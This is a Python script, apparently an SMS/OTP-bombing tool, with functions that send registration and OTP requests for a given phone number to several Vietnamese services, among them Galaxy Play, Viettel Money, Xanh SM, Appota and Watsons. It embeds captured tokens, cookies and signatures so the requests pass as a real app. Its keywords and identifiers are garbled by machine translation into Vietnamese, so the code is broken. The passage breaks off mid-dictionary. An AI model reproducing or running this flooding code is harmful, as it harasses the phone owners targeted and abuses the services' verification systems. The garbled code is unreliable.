def send_otp_via_galaxyplay(sdt):

    tiêu đề = {
        'chấp nhận': '*/*',
        'chấp nhận-ngôn ngữ': 'vi',
        'mã thông báo truy cập': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiI sIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        # 'chiều dài nội dung': '0',
        'dnt': '1',
        'nguồn gốc': 'https://galaxyplay.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    tham số = {
        'điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://api.glxplay.io/account/phone/checkPhoneOnly', params=params, headers=headers)
    
    tiêu đề = {
        'chấp nhận': '*/*',
        'chấp nhận-ngôn ngữ': 'vi',
        'mã thông báo truy cập': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiI sIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'nguồn gốc': 'https://galaxyplay.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    dữ liệu json = {
        'app_category': 'ứng dụng',
        'app_version': '2.0.0',
        'app_env': 'sản xuất',
        'session_id': '03ffa1f4-5695-e773-d0bc-de3b8fcf226d',
        'client_ip': '14.170.8.116',
        'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiI sIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        'client_timestamp': '1722356171541',
        'model_name': 'Windows',
        'user_id': '',
        'client_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'event_category': 'tài khoản',
        'on_screen': 'đăng nhập',
        'from_screen': 'trang đích',
        'event_action': 'nhấp chuột',
        'direct_object_type': 'nút',
        'direct_object_id': 'gửi_số_điện_thoại',
        'direct_object_property': sdt,
        'indirect_object_type': '',
        'indirect_object_id': '',
        'thuộc tính đối tượng gián tiếp': '',
        'context_format': '',
        'profile_id': '',
        'tên_hồ_sơ': '',
        'profile_kid_mode': '0',
        'giá_trị_bối_cảnh': {
            'là_người_dùng_mới': 1,
            'new_lp': 0,
            'thẻ_kiểm_tra': [],
        },
        'mkt_source': '',
        'mkt_campaign': '',
        'mkt_medium': '',
        'mkt_term': '',
        'mkt_content': '',
    }

    phản hồi = yêu cầu.post('https://tracker.glxplay.io/v1/event', tiêu đề=tiêu đề, json=json_data)
    




    
    tiêu đề = {
        'chấp nhận': '*/*',
        'chấp nhận-ngôn ngữ': 'vi',
        'mã thông báo truy cập': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI0OWNmMGVjNC1lMTlmLTQxNTAtYTU1Yy05YTEwYmM5OTU4MDAiLCJkaWQiOiI1OTRjNzNmNy1mMGI2LTRkYWMtODJhMy04YWNjYjk3ZWVlZTEiLCJpcCI6IjE0LjE3MC44LjExNiI sIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8ZWRnZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjIzNTU4OTcsImV4cCI6MTczNzkwNzg5N30.rZNmXmZiXi1j-XR1X9CPwJmhVthGmV856lsj5MOufEk',
        # 'chiều dài nội dung': '0',
        'dnt': '1',
        'nguồn gốc': 'https://galaxyplay.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    tham số = {
        'điện thoại': sdt,
    }

    phản hồi = yêu cầu.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
    

def send_otp_via_emartmall(sdt):
    bánh quy = {
        'emartsess': '30rqcrlv76osg3ghra9qfnrt43',
        'mặc định': '7405d27b94c61015ad400e65ba',
        'ngôn ngữ': 'vietn',
        'tiền tệ': 'VND',
        'emartCookie': 'Có',
    }

    tiêu đề = {
        'Chấp nhận': 'application/json, text/javascript, */*; q=0.01',
        'Ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'Kết nối': 'duy trì kết nối',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'emartsess=30rqcrlv76osg3ghra9qfnrt43; mặc định=7405d27b94c61015ad400e65ba; ngôn ngữ=vietn; tiền tệ=VND; emartCookie=Y',
        'DNT': '1',
        'Nguồn gốc': 'https://emartmall.com.vn',
        'Người giới thiệu': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'trống',
        'Chế độ lấy giây': 'cors',
        'Sec-Fetch-Site': 'cùng nguồn gốc',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Yêu cầu-Với': 'XMLHttpRequest',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    dữ liệu = {
        'di động': sdt,
    }

    phản hồi = yêu cầu.đăng(
        'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
        cookie=cookie,
        headers=tiêu đề,
        dữ liệu=dữ liệu,
    )
    



def send_otp_via_ahamove(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'chấp nhận-ngôn ngữ': 'vi',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'nguồn gốc': 'https://app.ahamove.com',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'di động': sdt,
        'country_code': 'VN',
        'firebase_sms_auth': Đúng,
    }

    phản hồi = yêu cầu.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)
    











def send_otp_via_ViettelMoney(sdt):

    url = "https://api8.viettelpay.vn/customer/v2/accounts/register"

    tải trọng = json.dumps({
    "identityType": "msisdn",
    "giá trị nhận dạng": sdt,
    "loại": "ĐĂNG KÝ"
    })

    tiêu đề = {
    'User-Agent': "Viettel Money/8.8.8 (com.viettel.viettelpay; bản dựng:3; iOS 17.0.2) Alamofire/4.9.1",
    'Chấp nhận-Mã hóa': "gzip;q=1.0, nén;q=0.5",
    'Loại nội dung': "ứng dụng/json",
    'phiên bản ứng dụng': "8.8.8",
    'sản phẩm': "VIETTELPAY",
    'kiểu-os': "ios",
    'chấp nhận-ngôn ngữ': "vi",
    'imei': "DAC772F0-1BC1-41E4-8A2B-A2ACFC6C63BD",
    'tên-thiết-bị': "iPhone",
    'os-version': "16.0",
    'bên có thẩm quyền': "ỨNG DỤNG",
    'Bánh quy': "_cfuvid=LAz8zVX12FF46VbA10qwPet5oT9iRMPRjuqQY5gK2_Q-1722405472979-0.0.1.1-604800000; __cf_bm=yVd7Vck.vpCRs0GU0WsQidPJgvwCAz77zL_F_DRq98k-1722405467-1.0.1.1-eqfWY8Vn QhNl9u9CbrHJ1HJYeuy_mkVC7NP6JWCnwgF5TBDChHaIL13xaPd_qsuu_TNacDBFSs2EyDjLV.Larg"
    }

    phản hồi = yêu cầu.post(url, dữ liệu=tải trọng, tiêu đề=tiêu đề)

    


def send_otp_via_xanhsmsms(sdt):
        # Kiểm tra và chuyển đổi số điện thoại
    nếu sdt.startswith('09'):
        sdt = '+84' + sdt[1:]
    elif sdt.startswith('03'):
        sdt = '+84' + sdt[1:]
    url = "https://api.gsm-api.net/auth/v1/public/otp/send"

    tham số = {
    'aud': "ứng dụng người dùng",
    'nền tảng': "ios"
    }

    tải trọng = json.dumps({
    "is_forgot_password": Sai,
    "điện thoại": sdt,
    "nhà cung cấp": "VIET_GUYS"
    })

    tiêu đề = {
    'User-Agent': "UserApp/3.15.0 (com.gsm.customer; bản dựng:89; iOS 17.0.2) Alamofire/5.9.1",
    'Chấp nhận': "application/json",
    'Chấp nhận-Mã hóa': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
    'Loại nội dung': "ứng dụng/json",
    'app-version-label': "3.15.0",
    'app-build-number': "89",
    'chấp nhận-ngôn ngữ': "vi",
    'nền tảng': "iOS",
    'aud': "ứng dụng người dùng"
    }

    phản hồi = yêu cầu.post(url, params=params, data=payload, headers=headers)

    


def send_otp_via_xanhsmzalo(sdt):


        # Kiểm tra và chuyển đổi số điện thoại
    nếu sdt.startswith('09'):
        sdt = '+84' + sdt[1:]
    elif sdt.startswith('03'):
        sdt = '+84' + sdt[1:]

    url = "https://api.gsm-api.net/auth/v1/public/otp/send"

    tham số = {
    'nền tảng': "ios",
    'aud': "ứng dụng người dùng"
    }

    tải trọng = json.dumps({
    "điện thoại": sdt,
    "is_forgot_password": Sai,
    "nhà cung cấp": "ZNS_ZALO"
    })

    tiêu đề = {
    'User-Agent': "UserApp/3.15.0 (com.gsm.customer; bản dựng:89; iOS 17.0.2) Alamofire/5.9.1",
    'Chấp nhận': "application/json",
    'Chấp nhận-Mã hóa': "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
    'Loại nội dung': "ứng dụng/json",
    'app-version-label': "3.15.0",
    'app-build-number': "89",
    'chấp nhận-ngôn ngữ': "vi",
    'nền tảng': "iOS",
    'aud': "ứng dụng người dùng"
    }

    phản hồi = yêu cầu.post(url, params=params, data=payload, headers=headers)


    



def send_otp_via_popeyes(sdt):

    tiêu đề = {
        'chấp nhận': 'ứng dụng/json',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://popeyes.vn',
        'ppy': 'CWNOBV',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://popeyes.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng một trang web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-client': 'Ứng dụng web',
    }

    dữ liệu json = {
        'điện thoại': sdt,
        'firstName': 'Nguyễn',
        'lastName': 'Ngọc',
        'email': 'th456do1g110@hotmail.com',
        'mật khẩu': 'et_SECUREID()',
    }

    phản hồi = yêu cầu.post('https://api.popeyes.vn/api/v1/register', headers=headers, json=json_data)

    

















def send_otp_via_ACHECKIN(sdt):
    # Yêu cầu 1
    url1 = "https://codepush.appcenter.ms/v0.1/public/codepush/update_check"

    tham số1 = {
    'khóa_triển_hành': "NyrEQrG2NR2IzdRgbTsfQZV-ZK7h_tsz8BjMd",
    'app_version': "1.5",
    'gói_băm': "d2673f8362359fe9129b908e7fd445482becea4d3220ed385d58cae33c7e0391",
    'nhãn': "v39",
    'client_unique_id': tạo_id_ngẫu_nhiên()
    }

    tiêu đề1 = {
    'Tác nhân người dùng': "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
    'Chấp nhận': "application/json",
    'Loại nội dung': "ứng dụng/json",
    'x-codepush-plugin-version': "5.7.0",
    'x-codepush-sdk-version': "^3.0.1",
    'Ngôn ngữ chấp nhận': "vi-VN,vi;q=0.9",
    'x-codepush-plugin-name': "react-native-code-push"
    }

    response1 = requests.get(url1, params=params1, headers=headers1)
    

    # Yêu cầu 2
    url2 = "https://id.acheckin.vn/api/graphql/v2/mobile"

    payload2 = json.dumps({
    "operationName": "IdCheckPhoneNumber",
    "biến": {
        "số_điện_thoại": sdt
    },
    "query": "query IdCheckPhoneNumber($phone_number: String!) {\n đột biến: checkPhoneNumber(phone_number: $phone_number)\n}\n"
    })

    tiêu đề2 = {
    'Tác nhân người dùng': "AppotaHome/29 CFNetwork/1474 Darwin/23.0.0",
    'Loại nội dung': "ứng dụng/json",
    'chấp nhận-ngôn ngữ': "vi-VN,vi;q=0.9",
    'ủy quyền': "không xác định"
    }

    response2 = requests.post(url2, data=payload2, headers=headers2)
    

    # Yêu cầu 3
    payload3 = json.dumps({
    "operationName": "RequestVoiceOTP",
    "biến": {
        "số_điện_thoại": sdt,
        "hành động": "ĐĂNG KÝ",
        "băm": "6af5e4ed78ee57fe21f0d405c752798f"
    },
    "query": "mutation RequestVoiceOTP($phone_number: String!, $action: REQUEST_VOICE_OTP_ACTION!, $hash: String!) {\n requestVoiceOTP(phone_number: $phone_number, action: $action, hash: $hash)\n}\n"
    })

    response3 = requests.post(url2, data=payload3, headers=headers2)
    







def send_otp_via_APPOTA(sdt):


    # Yêu cầu 1
    url1 = "https://mobile.useinsider.com/api/v3/session/start"

    payload1 = json.dumps({
    "insider_id": id_ngẫu_nhiên,
    "tên_đối_tác": "appotapay",
    "lý do": "mặc định",
    "udid": id_ngẫu_nhiên,
    "thông tin thiết bị": {
        "location_enabled": Sai,
        "phiên bản ứng dụng": "5.2.10",
        "push_enabled": Đúng,
        "os_version": "17.0.2",
        "pin": 90,
        "sdk_version": "13.4.3-RN-6.4.4-nh",
        "kết nối": "wifi"
    }
    })

    tiêu đề1 = {
    'Tác nhân người dùng': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
    'Loại nội dung': "ứng dụng/json",
    'ts': "1722417438",
    'chấp nhận-ngôn ngữ': "vi-VN,vi;q=0.9"
    }

    response1 = requests.post(url1, data=payload1, headers=headers1)
    

    # Yêu cầu 2
    url2 = "https://api.gw.ewallet.appota.com/v2/users/check_valid_fields"

    payload2 = json.dumps({
    "số_điện_thoại": sdt,
    "email": "",
    "tên người dùng": "",
    "ts": 1722417439,
    "chữ ký": "480518ec08912b650efe1eaa555c2c55e47d2be2b2c98600616de592b3cafc11"
    })

    tiêu đề2 = {
    'Tác nhân người dùng': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
    'Loại nội dung': "ứng dụng/json",
    'phiên bản máy khách': "5.2.10",
    'aw-device-id': định dạng_id_thiết_bị,
    'ngôn ngữ': "vi",
    'client-authorization': "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
    'x-device-id': định dạng_id_thiết_bị,
    'x-client-build': "119",
    'x-client-version': "5.2.10",
    'nền tảng': "ios",
    'chấp nhận-ngôn ngữ': "vi-vn",
    'x-client-platform': "ios",
    'ref-client': "ví ứng dụng",
    'x-request-id': "3643ec43-20c4-446d-b3b0-0ac86adf5528",
    'x-yêu cầu-ts': "1722417439"
    }

    response2 = requests.post(url2, data=payload2, headers=headers2)
    

    # Yêu cầu 3
    url3 = "https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code"

    payload3 = json.dumps({
    "số_điện_thoại": sdt,
    "người gửi": "SMS",
    "ts": 1722417441,
    "chữ ký": "5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5"
    })

    tiêu đề3 = {
    'Tác nhân người dùng': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
    'Loại nội dung': "ứng dụng/json",
    'phiên bản máy khách': "5.2.10",
    'aw-device-id': định dạng_id_thiết_bị,
    'ngôn ngữ': "vi",
    'client-authorization': "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
    'x-device-id': định dạng_id_thiết_bị,
    'x-client-build': "119",
    'x-client-version': "5.2.10",
    'nền tảng': "ios",
    'chấp nhận-ngôn ngữ': "vi-vn",
    'x-client-platform': "ios",
    'ref-client': "ví ứng dụng",
    'x-request-id': "4031b828-a4fc-45cb-aeac-c6e3b2f504ab",
    'x-request-ts': "1722417441"
    }

    response3 = requests.post(url3, data=payload3, headers=headers3)
    







def send_otp_via_Watsons(sdt):

    url = "https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep"

    tham số = {
    'lang': "vi"
    }

    tải trọng = json.dumps({
    "otpTokenRequest": {
        "hành động": "ĐĂNG KÝ",
        "loại": "SMS",
        "Mã quốc gia": "84",
        "mục tiêu": sdt
    },
    "Địa chỉ mặc định": {
        "mobileNumberCountryCode": "84",
        "mobileNumber": sdt
    },
    "mobileNumber": sdt
    })

    tiêu đề = {
    'Người dùng-Tác nhân': "WTCVN/24050.8.0 (iOS/17.0.2)",
    'Chấp nhận': "application/json, text/plain, */*",
    'Loại nội dung': "ứng dụng/json",
    'x-session-token': "5b3f554c05258ea55ab506a1ffc7aa8d",
    'hành lý': "sentry-environment=preprod,sentry-public_key=8d22ab30a0174b6489b1e647ff6a8a28,sentry-release=vn.com.watsons.app%4024050.8.0%2B202407111813,sentry-trace_id=57b207211ecb40ad880861651a5e1914",
    'waiting-room-access-token': "",
    'x-app-name': "Watsons%20VN",
    'dữ liệu cảm biến x-acf': "4,i,QeSJMIt5h2iaPmIbvXvXq4tVimb8YYYoz9HVkaOkZ4+50dFkANwHVTHJruLOhscngAw9Ajbz0ri+8cJcbazX Btp8Zn1dVjoqDt2YHcMy/yzo2Wjm+Zbvhxlb9t428/+fUnEMAsO67eNo5E8d2NjKOEFsAS+/AhDaXP0+raig9UU=,nAPyAaP9OJeaQNum0Y6YD8WCUBTFQKSGe/JvZkOrtTuLVg4V6hbPeNgDHVgxQeTc1kD+f39Lpk9739rigwa9dWFav4AM7lc8JpVCNuDFC44k5/UQKyt8gAZz+9hkEk6wzYB7o2ezvooWZEXQTZumLksEu6Nf41juprM/tD3KBmI=$aJlQYeu3STdiNV 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$7,3,12$$",
    'chấp nhận-ngôn ngữ': "vi",
    'queue-target': "null",
    'cache-control': "không có bộ nhớ đệm",
    'sentry-trace': "57b207211ecb40ad880861651a5e1914-4b3ff6172e084c9d-0",
    'x-app-version': "24050.8.0",
    'env': "sản xuất",
    'Bánh quy': "ak_bmsc=4ACC8C3607E0E9232360FDA1E1854E4F~0000000000000000000000000000000~YAAQ9VJNG979NwaRAQAA/r9eCBi3G4NOUhKyBSBzBjyDh SfmrUMlGbtziWkFwdlHDattQysx6ioqzAwBYysRMFRqwZNTLa5UIwKiMCqQK52EXJca1/mPkvDYKlUNY6jMqBp8gA0T/uUQNLb+ADwajazL1i/y/uerZjb1 BWt4OlsKrjPijiMfqPIW3MhtNi0jydTzlN2GyA9+mOZ16Vbsvdlo4Y+wr1aQAz+eqVktxM+b61s5xpAUDRo5bItDmWb2AjIJyyFU6QmLtiO+z/fwZvUUinqpOZpqrPboLMWwk8M2Jw6KKE/FIloJcpNvF+MUcPxGpI2YlEYshvYxxxYBH+Vn9mdRSYayp6sadTKWrMhVgaObxee0B9CzbCgiY+yxTlapAx7YiqgX4Q==; dtCookie=v_4_srv_36_sn_3F2A2BE1202593EA006C41DC139C0176_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0; ROUTE=.accstorefront-78c88c89d7-lvpvg; ủy quyền=pUbs8G_8XY2Hx9NiB8aJ3NCtnxk; loại token=khách"
    }

    phản hồi = yêu cầu.post(url, params=params, data=payload, headers=headers)
    



def send_otp_via_hoangphuc(sdt):
    bánh quy = {
        'form_key': 'fm7TzaicsnMIyKbm',
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'PHPSESSID': '450982644b33ef1223c1657bb0c43204',
        'form_key': 'fm7TzaicsnMIyKbm',
        'mage-messages': '',
        'sản phẩm vừa xem': '{}',
        'sản phẩm đã xem gần đây_trước': '{}',
        'sản phẩm được so sánh gần đây': '{}',
        'sản phẩm so sánh gần đây_trước': '{}',
        'product_data_storage': '{}',
        'mage-cache-sessid': 'đúng',
